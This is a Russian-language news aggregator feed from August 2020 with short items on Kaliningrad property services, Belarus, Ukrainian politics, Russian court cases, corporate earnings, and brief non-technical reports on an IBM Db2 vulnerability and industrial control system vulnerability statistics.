Современные электронные сервисы позволяют совершить сделку по покупке и регистрации, не отвлекаясь от отдыха. По данным Росреестра, более 1 млн покупателей воспользовались сервисом "Электронная регистрация". Это совместный проект Росреестра и Сбербанка, который позволяет покупателям зарегистрировать право собственности удалённо без посещения МФЦ. Срок регистрации сделок в электронном виде не превышает 4 дней, что в 2 раза быстрее по сравнению со стандартными сроками регистрации.  Кроме того, при покупке жилья в ипотеку с использованием сервиса "Электронная регистрация" Сбербанк предоставляет скидку на ставку.
В Калининградском отделении Сбербанка также отмечают популярность электронного сервиса "ДомКлик". Данная платформа активно используется не только для проведения ипотечных сделок, но и в сделках без использования заёмных средств, количество которых увеличилось вдвое.
"Механизм дистанционного подбора и приобретения недвижимости у сервиса "ДомКлик" был в деталях отработан ещё до начала пандемии коронавируса и сейчас функционирует без сбоев, обеспечивая клиентам доступ к полному циклу оформления сделки и регистрации недвижимости, — отметил управляющий Калининградским отделением ПАО Сбербанк Андрей Свердлов. —  Любые консультации со специалистами банка, юристами, оценщиками и риелторами доступны онлайн. Всё это позволяет без помех совершать сделки по приобретению недвижимости, в том числе без ипотеки.
Данный сервис очень актуален в туристический сезон. Покупатель во время отдыха подбирает себе жильё и после может в дистанционном формате совершить сделку».
Таким образом, приобрести понравившееся жильё возможно в любое удобное время, без посещения МФЦ и Росреестра. Документы на регистрацию отправит менеджер банка или застройщик по строящемуся жилью. Уже зарегистрированные документы придут всем участникам сделки на электронную почту, а также будут доступны в личном кабинете. Расчёт происходит следующим образом: при использовании безналичного "Сервиса безопасных расчётов" покупатель переводит деньги на специальный счёт, продавец получает их на свой счёт автоматически после подтверждения Росреестра о регистрации сделки. Визит в банк и закладка наличных в ячейку не требуются.
Андрей Свердлов также добавил, что для покупки необязательно находиться в Калининграде: заключить сделку можно после возращения домой.
"При совершении сделки покупатель может находиться в другом регионе, например, на Дальнем Востоке, а продавец в Калининграде. Услуга предоставляется в офисе ипотечного кредитования Сбербанка либо в офисах более 80 застройщиков Калининградской области".
ПАО Сбербанк
Новости компаний
 
Источники

Львовский городской совет отменил очередное пленарное заседание, которое должно было состояться 21 августа, из-за вспышки коронавируса.
Об этом в Facebook сообщил депутат Львовского городского совета Игорь Телишевский, передает RegioNews.
 
Депутаты и работники совета перед пленарным заседанием сдавали тесты на наличие коронавируса.
Совместное решение было принято сегодня, 20 августа. Такое предложение поддержал мэр Львова Андрей Садовый и председатели фракций, которые принимали участие в онлайн-заседании коллегии.
Читайте также: Коронавирус в Украине: хроника (обновляется)
Напомним, в Украине установлен очередной антирекорд по Covid-19, за сутки заболели 2134 человека.
 
Источники

Президент России Владимир Путин обсудил в телефонном разговоре с председателем Европейского совета Шарлем Мишелем ситуацию в Белоруссии. Об этом сообщил Кремль.
В соответствии с договорённостью Шарль Мишель информировал об итогах прошедшего 19 августа внеочередного саммита ЕС, посвящённого событиям в Белоруссии.
«С российской стороны акцентирована контрпродуктивность оказания какого-либо давления на руководство суверенного Белорусского государства и вмешательства извне в происходящие там внутренние процессы. Подтверждено, что скорейшая нормализация ситуации в Белоруссии отвечает интересам как России, так и Евросоюза», - сообщил Кремль.
9 августа в Белоруссии состоялись президентские выборы, по результатам которых ЦИК республики признал победившим Александра Лукашенко. С этим не согласились сторонники кандидата в президенты Светланы Тихановской, объединившей оппозицию. Сразу после объявления официальных итогов выборов президента в Белоруссии начались массовые протесты и забастовки. Граждане требуют, чтобы Александр Лукашенко ушёл с поста президента. 
 
Источники

В Калининградской области жители смогут позвонить на горячую линию, чтобы получить разъяснения по обеспечению бесплатным питанием учащихся младших классов. об этом сообщает пресс-служба правительства региона в четверг, 20 августа.
Задать вопросы можно по телефону в региональном министерстве образования +7 (4012) 59-29-62. С 1 сентября более 70 тысяч калининградских школьников будут обеспечены горячим питанием. Из них 50,5 тыс. — младшеклассники, 15 тыс. — дети из малоимущих семей и 5 тыс. — с ограниченными возможностями здоровья.
Мишустин предложил с 1 сентября ввести по всей России бесплатное горячее питание для младших классов. Ранее в областном правительстве сообщали, что нововведение откладывается.
 
Источники

В пятницу, 21 августа, президент Украины Владимир Зеленский совершит рабочую поездку в Николаевскую область.
Об этом сообщили в пресс-службе Николаевской ОГА, пишет RegioNews.
О программе визита, а также в локациях, которые планирует посетить глава государства, информация отсутствует.
По неофициальным данным ожидается, что завтра президент представит команду «Слуг народа», которая будет участвовать в местных выборах. Особый интерес вызывает представление кандидата в мэры Николаева. Ранее на эту должность планировали выдвигать Татьяну Домбровскую, вокруг которой возник скандал из-за некорректных высказываний коллег по партии Александра Корниенко и Давида Арахамии.
 
Напомним, вчера Владимир Зеленский представил кандидата в мэры Запорожья.
Сегодня Зеленский представил кандидата на пост мэра Херсона, им стал Юрий Кириллов.
 
Источники

Специалисты компании Trustwave раскрыли подробности об уязвимости в системе управления реляционными базами данных IBM Db2, которая может использоваться для раскрытия информации или инициирования состояния отказа в обслуживании.
IBM Db2 - семейство гибридных систем управления данными, задействующих искусственный интеллект для анализа и управления структурированными и неструктурированными данными.
Уязвимость, получившая идентификатор CVE-2020-4414, заключается в том, что разработчики не реализовали меры защиты в отношении разделяемой памяти, используемой функцией трассировки Db2. В результате локальный пользователь может получить права чтения/записи в области памяти, что позволит получить доступ к конфиденциальной информации, а также предоставит возможность изменить работу подсистемы трассировки и вызвать отказ в обслуживании базы данных.
По словам специалистов, уязвимость возможно проэекслуатировать удаленно с помощью вредоносного ПО.
«Процесс с низкими привилегиями (т.е. вредоносная программа), запущенная на том же устройстве, что и база данных Db2, может модифицировать трассировщик и перехватить конфиденциальные данные, которые в дальнейшем могут использоваться в последующих атаках», - пояснили исследователи.
Для эксплуатации уязвимости атакующему потребуется отправить специально сформированный запрос функции трассировки.
Проблема затрагивает выпуски IBM Db2 V9.7, V10.1, V10.5, V11.1 и V11.5 для всех платформ. IBM выпустила патч для данной уязвимости в июне нынешнего года.
 
Источники

Американский производитель косметики Estee Lauder отчитался о финансовых результатах за четвертый фискальный квартал, в соответствии с которыми чистый убыток составил $462 млн или $1,28 на акцию по сравнению с прибылью в $157 млн или 43 цента на бумагу годом ранее. При этом скорректированный убыток в расчете на одну бумагу оказался на уровне 53 центов, тогда как аналитики ожидали убыток в 16 центов.
Согласно отчету компании, продажи в минувшем квартале сократились с $3,59 млрд за аналогичный период прошлого года до $2,43 млрд, не дотянув до усредненного прогноза аналитиков в $2,45 млрд.
В то же время руководство компании сообщило, что 15 сентября выплатит дивиденды в размере 48 центов на одну акцию.
Согласно оценкам Estee Lauder, по итогам первого фискального квартала ожидается снижение продаж на 12-13% г/г при прибыли в размере 77-83 центов в расчете на одну акцию.
 
Источники

В лесу на Балтийской косе, где в палаточном лагере при взрыве пострадали двое детей, нашли ещё четыре снаряда времён войны. Об этом сообщается на странице администрации Балтийского городского округа в "ВКонтакте" в четверг, 20 августа.
"Убедительно просим отдыхающих временно не посещать участок лесополосы от Витланда до Павлово. Въезды в лес патрулируют сотрудники полиции и Росгвардии", — говорится в сообщении.
Работы по разминированию продлятся три-четыре дня, уточнили в мэрии. Калининградцев просят быть осторожными и не приближаться к взрывоопасным предметам, не трогать и не перемещать их. Место обнаружения снарядов рекомендуется "обозначить заметным ориентиром и удалиться на безопасное расстояние" не менее 300 метров, и уже тогда звонить 112.
8 августа в палаточном лагере в районе пос. Павлово пострадали двое детей, которые грелись у костра. Огонь на земле развели взрослые, не заметив снаряда времён ВОВ. Боеприпас взорвался. Пять вопросов о ЧП под Балтийском — в материале "Клопс".
 
Источники

В Москве у здания ГУ МВД на Петровке, 38 задержали муниципального депутата Академического района Левона Смирнова. Об этом он сам рассказал ОВД-Инфо.
Левон Смирнов написал мелом на асфальте у здания на Петровке фразу «Свободу Владимиру Воронцову». После чего сотрудники 2-го оперативного полка не дали ему уйти и вызвали сотрудников полиции территориального отдела.
Приехавший патруль отдела полиции «Тверской» пригласил депутата проехать в отдел для дачи объяснения.
Новость обновляется
 
Источники

Нижегородский районный суд на пять суток арестовали гражданского активиста Максима Алибаева, задержанного за одиночный пикет в поддержку незарегистрированного кандидата в Госдуму. Первые трое суток он уже отсидел в конце июля. Об этом ОВД-Инфо сообщил председатель нижегородского «Мемориала» Аркадий Галкер.
Свой пикет против недопуска кандидата от «Яблока» Алексея Садомовского на выборах в городскую думу Алибаев провел 26 июля. К нему подошли полицейские и потребовали предъявить паспорт, а после его отказа задержали.
На следующий день суд признал его виновным в неповиновении сотрудникам полиции (ст. 19.3 КоАП) и арестовал на трое суток. Через некоторое время Нижегородский областной суд отменил это решение и оправил дело на новое рассмотрение. Поводом стало то, что Алибаев является членом УИК с правом решающего голоса, и привлечение его к административной ответственности возможно только с санкции прокурора.
 
Источники

На десяти киевских пляжах ввели запрет на купание из-за аномальной жары и цветения воды.
Об этом сообщает пресс-служба КГГА, передает RegioNews.
После проведения лабораторных исследований проб воды было обновлено текущие статусы муниципальных пляжей столицы.
 
Красные флаги о запрете на купание вывешены на пляжах "Венеция", "Радуга", "Детский", "Золотой", "Молодежный", "Предместная Слободка", "Радуга", "Тельбин", "Центральный" и "Чорторый".
В КГГА отмечают, что красные и желтые флаги обусловлены аномальной жарой, из-за которой происходит активное цветение воды в Днепре. Это значительно ухудшает нормативные показатели воды.
Напомним, за месяц на пляжах Украины погибли почти 200 человек, большинство трагических случаев происходит по неосторожности.
 
Источники

Член Центральной избирательной комиссии Сергей Постовой и главный санитарный врач Украины Виктор Ляшко обсудили меры безопасности во время проведения местных выборов. Ляшко заверил, что выборы будут.
Как передает RegioNews, об этом в Facebook написал Ляшко.
 
Ранее стало известно, какую сумму Украина потратит на местные выборы.
 
Источники

Украина пока еще не получила список лиц, которых готовят для обмена с российской стороны. В свою очередь украинская сторона уже передала список для обмена.
Об этом на брифинге во время визита в Херсонскую область заявил президент Владимир Зеленский, информирует Regionews.
По его словам, данный вопрос обсуждался во время вчерашнего заседания ТКГ.
 
 
Напомним, 7 августа Ермак анонсировал новый обмен пленными в формате "100 на 100".
13 августа Украина передала в ОБСЕ свой обновленный список на обмен пленными.
 
Источники

Более 70% уязвимостей в АСУ ТП, обнаруженных в первой половине 2020 года, можно использовать удаленно. Исследовательская группа из компании Claroty представила отчет, который включает оценку 365 уязвимостей в АСУ ТП, опубликованных в Национальной базе данных по уязвимостям (NVD), и 139 сообщений, выпущенных командой экстренного реагирования на киберугрозы промышленных систем управления (ICS-CERT), которые затрагивали 53 поставщика АСУ ТП.
По сравнению с первым полугодием 2019 года количество уязвимостей в АСУ ТП увеличилось на 10,3%, в то время как количество сообщений ICS-CERT увеличилось на 32,4%. Более 75% уязвимостей были оценены как опасные (53,15%) или критические (22,47%) по шкале CVSS.
Как отметили эксперты, более 70% уязвимостей, опубликованных NVD, можно эксплуатировать удаленно. Кроме того, наиболее частым потенциальным воздействием было удаленное выполнение кода, возможное путем эксплуатации 49% уязвимостей, за которым следует чтение данных приложений (41%), вызов отказа в обслуживании (39%) и обход механизмов защиты (37%).
Энергетическая сфера, критическое производство и инфраструктуры водоснабжения в наибольшей степени пострадали от уязвимостей, обнаруженных в первом полугодии 2020 года. Из 385 уникальных уязвимостей, занесенных в базу данных Common Vulnerabilities and Exposures, в энергетическом секторе было обнаружено 236 проблем, в критически важных производственных предприятиях — 197, а в системах водоснабжения — 171.
 
Источники

Белорусская погранслужба готовится к усилению охраны рубежей, в частности, в Гродненской области, которая граничит с Литвой и Польшей. Об этом со ссылкой на официального представителя государственного пограничного комитета республики Антона Бычковского сообщает "РИА Новости" в четверг, 20 августа.
"В связи со сложившейся обстановкой в стране органами пограничной службы проводятся мероприятия по усилению охраны государственной границы. Увеличено количество пограничных нарядов. Осуществляется усиленный контроль соблюдения правил пограничного режима со стороны лиц и транспортных средств, прибывающих в пограничную зону и пограничную полосу", — сообщил Бычковский (цитата по "РИА Новости").
По словам Бычковского, меры касаются всей госграницы. Цель — не допустить в Белоруссию из других стран  "боевиков, оружия, боеприпасов и денег для финансирования беспорядков".
Войска на западе Белоруссии привелив полную боевую готовность. Президент Александр Лукашенко выразил озабоченность тем, что происходит вдоль западных границ страны.
 
Источники

Для реализации программ по реставрации и реконструкции украинских культурных объектов необходимо выделить более 55 миллиардов гривен.
Как сообщает RegioNews, об этом в четверг, 20 августа, заявил министр культуры и информационной политики Украины Александр Ткаченко.
 
По его словам, речь идет не только о реставрации и реконструкции старых объектов, но и строительстве новых, а также создании Центров культурных услуг, преобразовании клубов и библиотек в современные комплексы.
На данный момент за ведомством числится 130 тысяч недвижимых объектов, 80% из которых нуждаются в срочной реставрации.
 
Ранее сообщалось, что 13 августа в Киеве активисты провели митинг под домом министра культуры Ткаченко.
 
Источники

Московский областной суд признал законным арест активиста Алексея Холкина по делу об экстремизме (ст.20.3.1 КоАП РФ). Об этом сообщает глава международной «Агоры» Павел Чиков со ссылкой на адвоката Григория Червонного.
В начале июля июля Холкин явился в прокуратуру Воскресенска для дачи пояснений по возбужденному административному делу. Там его задержали полицейские и доставили в городской суд, который арестовал его на 5 суток. Активист подавал апелляционную жалобу на арест в Московский областной суд.
Поводом к возбуждению дела стало стал видеоролик с призывом 22 июня приходить на «митинг против фашизма», размещенный в «Хронике» на его странице в Facebook. Прокуратура усмотрела в публикации «признаки экстремистского характера и фейковых новостей» и отправила материалы на экспертизу.
Эксперты в публикации обнаружили «психологические и лингвистические признаки» возбуждения ненависти к госслужащим, а также признаки фейковых сообщений про коронавирус и методы борьбы с пандемией.
Алексей Холкин в суде заявлял, что не публиковал видео на своей странице — это сделал другой пользователь, поставив метку с его именем. По словам адвоката Червонного, полицейские подумали, что активист репостнул ролик, хотя «это не так». Когда Холкин увидел пост, он снял метку и удалил его со своей страницы, уточнил адвокат:
 
Тем не менее судья отказалась исследовать акт осмотра, поскольку «состав правонарушения образует факт нахождения ссылки на странице, а не конкретные действия Холкина по ее размещению».
Таким образом, Московский областной суд оставил решение суда первой инстанции без изменения, а апелляционную жалобу — без удовлетворения.
Григорий Червонный сообщил, что намерен обратиться с жалобой в Европейский суд по правам человека.
«Круто: человека тэгнули в ролике на Facebook, ролик автоматически попал к нему в хронику, ролик оказался экстремистским, человека оштрафовали, хотя он его даже не публиковал. Чудеса российского правосудия», — прокомментировал случай с Холкиным руководитель&nbsp; интернет-журнала It’s My City Дмитрий Колезев.
Холкин является экологическим активистом, который борется, в частности, против мусоросжигательного Подмосковье, и он уже давно стал объектом внимания местных правоохранительных органов. В июле он опубликовал видеоролик с подробностями его дела, где выразил вполне обоснованное опасение, что его случай может стать прецедентом, поскольку «теперь могут привлекать к ответственности за действия, которых ты не совершал»:
По его мнению, таким образом власти пытаются заставить граждан перестать осуществлять любые призывы, в том числе — отстаивать свои права.
 
Источники

Президент Украины Владимир Зеленский заявил, что удовлетворен результатами работы Трехсторонней контактной группы по урегулированию ситуации на Донбассе под руководством Леонида Кравчука.
Об этом Зеленский заявил сегодня журналистам в Херсонской области во время брифинга, пишет RegioNews.
 
По словам Зеленского, уже месяц боевых ранений и боевых жертв на фронте нет и это большое достижение.
Глава государства отметил, что переговоры в формате минского процесса должны продолжаться — ТКГ должна постоянно встречаться пока в видео-формате из-за COVID-19.Your browser does not support HTML5 video.
Напомним, по результатам нового заседания Трехсторонней контактной группы касательно ситуации на Донбассе удалось договорится по четырем новым участкам разведения сил и средств.
 
Источники

Американский оператор магазинов-складов BJ's Wholesale Club Holdings представил финансовые результаты за второй фискальный квартал, в соответствии с которыми чистая прибыль увеличилась почти вдвое с $54,5 млн или 39 центов на акцию годом ранее до $106,6 млн или 76 центов на бумагу. При этом скорректированная прибыль в расчете на одну акцию оказалась на уровне 77 центов, превысив усредненный прогноз аналитиков в 60 центов.
Согласно отчету компании, выручка за три месяца с окончанием 1 августа возросла на 18,2% г/г и достигла $3,95 млрд, что оказалось лучше ожиданий аналитиков в $3,73 млрд. В то же время сопоставимые продажи повысились на 24,2% г/г против консенсус-прогноза в 15,5% г/г, тогда как сопоставимые онлайн-продажи взлетели на 300% г/г.
Примечательно, что с начала года акции BJ's Wholesale Club подорожали на 90,9%.
 
Источники

За рулём автомобиля Михаила Ефремова в момент аварии был не сам артист, а другой человек, заявил очевидец Александ Кобец в Пресненском суде Москвы. Об этом сообщает "Интерфакс"в четверг, 20 августа.
"Я подхожу к машине черной, там сидит два человека, один на водительском сидении пытался что-то убрать руками.... Это был не Ефремов... Я не знаю, кто это был, но лицо известное, может, он просто похож на кого-то", — заявил свидетель (цитата по "Интерфаксу").
Кобец признался, что долго не решался давать показания, его уговаривал адвокат Ефремова Пашаев. Согласился только потому, что "невиновного топят".
Смертельная авария с участием артиста произошла 8 июня. Подробнее о ДТП и ходе расследования — в материалах "Клопс".
 
Источники

20 августа во время визита в Херсонскую область президент Владимир Зеленский проинспектировал работу «Укрпочты».
Об этом в Facebook сообщила пресс-секретарь президента Юлия Мендель, передает RegioNews.
 
На видео видно, как президент с сопровождением заходит во двор частного дома, в руках несет посылку.
 
Зеленский также спросил местных жительниц, действительно ли им удобно и дешевле получать лекарства через почтальонов.
Напомним, 20 августа Зеленский прибыл с рабочей поездкой в ​​Херсонскую область, он осмотрит объекты, которые строятся в рамках программы «Большая стройка».
Также Зеленский представил кандидата на пост мэра Херсона, им стал Юрий Кириллов.
 
Источники

Национальная полиция 20 августа направила экс-владельцу "Дельта Банка" (находится в стадии ликвидации) Николаю Лагуну повестку о вызове на допрос.
Повестка опубликована на сайте Нацполиции, сообщает RegioNews.
Лагуну необходимо 26 августа прибыть в главное следственное управление Нацполиции для вручения уведомления о подозрении в уголовном производстве, открытом в марте 2015 года. Правоохранители хотят также допросить Лагуну в качестве подозреваемого и вручить ему ходатайство об избрании меры пресечения.
Известно, что "Дельта Банк" был основан в 2006 году. На начало 2015 года его владельцами были Лагун (70,6%) и Cargill Financial Services International, Inc. (29,39%). На тот момент банк занимал четвертое место среди 158 действовавших на тот момент по размеру активов. В октябре 2015 года Нацбанк отозвал банковскую лицензию "Дельта Банка".
По состоянию на начало 2020 года долги "Дельта Банка" перед Фондом гарантирования вкладов физлиц составляли почти 9 млрд грн, а перед Национальным банком Украины – около 5 млрд грн по кредитам рефинансирования.
Напомним, в мае 2015 года Генеральная прокуратура открыла уголовное производство против должностных лиц неплатежеспособного "Дельта Банка", владельцем которого является Николай Лагун.
 
Источники

Группа народных депутатов во главе с Председателем Верховной Рады Дмитрием Разумковым зарегистрировали в парламенте проект постановления о конкурсе на лучший эскиз большого Государственного Герба Украины.
Текст документа обнародовали на сайте ВР, сообщает RegioNews.
Проектом постановления предлагается поручить Кабмину провести конкурс на лучший эскиз большого Государственного Герба.
В частности, проектом постановления №3994 "Об объявлении конкурса на лучший эскиз большого Государственного Герба Украины” до 1 октября 2020 года правительство обязывают образовать оргкомитет, утвердить соответствующие положения, а также решить вопрос финансового и материально-технического обеспечения организации и проведения конкурса.
До 1 ноября Кабмин должен будет провести всестороннее общественное обсуждение эскиза большого Государственного Герба, а до 1 декабря определить победителя конкурса и представить на рассмотрение Верховной Рады предложения по результатам конкурса.
Напомним, рассмотрение проекта постановления №3994 является одиним из шести вопросов повестки дня внеочередной сессии ВР, которую с пикер Дмитрий Разумков распорядился созвать 25 августа.
 
Источники

В Правдинском районе осудили к девяти годам колонии строгого режима местного жителя, который в сентябре 2019 года до смерти забил свою мать. Об этом сообщает пресс-служба Правдинского районного суда в четверг, 20 августа.
Трагедия произошла в посёлке Белый Яр. Пьяный мужчина поссорился с матерью и нанёс ей больше 30 ударов металлическим костылём и кулаками по голове и телу.  От полученных травм потерпевшая, которая после перелома ноги мало двигалась и много лежала, скончалась спустя несколько дней в больнице.
В заседании подсудимый признался, что избивал мать неоднократно. В тот день конфликт возник из-за того, что она отказалась идти в магазин за алкоголем. Вину свою мужчина признал.
Суд квалифицировал действия подсудимого как умышленное причинение тяжкого вреда здоровью, опасного для жизни человека, повлекшее по неосторожности смерть потерпевшего. К обстоятельствам, смягчающим наказание, была отнесена явка с повинной, к отягчающим — совершение преступления в состоянии опьянения.
Мужчину приговорили к девяти годам и трём месяцам лишения свободы с отбыванием в колонии строгого режима. Приговор не вступил в законную силу.
 
Источники

Вблизи Авдеевки враг совершил несколько провокационных выстрелов из крупнокалиберного пулемета, сообщил штаб ООС.
Вооруженная провокация была неприцельной и не угрожала жизни и здоровью украинских солдат, поэтому военнослужащие Объединенных сил огонь в ответ не открывали.
Среди украинских защитников нет боевых потерь и ранений.
 
За прошедшие сутки боевики трижды нарушили режим «тишины», сообщили украинские военные.
 
Источники
